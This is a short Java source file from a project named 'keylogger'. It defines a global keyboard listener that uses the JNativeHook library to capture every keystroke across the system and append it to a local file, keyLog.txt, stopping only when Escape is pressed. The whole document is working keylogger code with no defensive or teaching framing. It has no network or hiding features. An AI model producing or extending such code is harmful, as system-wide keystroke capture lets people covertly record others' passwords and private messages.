package com.keylogger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;

public class GlobalKeyListener implements NativeKeyListener{
    private ConfigLogger logger;
    public GlobalKeyListener() throws IOException {
        this.logger = new ConfigLogger("keyLog.txt");
    }
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String txt = NativeKeyEvent.getKeyText(e.getKeyCode());
        logger.writeFile(txt);
        // Exits the program
        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException nativeHookException) {
                nativeHookException.printStackTrace();
            }
        }
    }
    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }
}
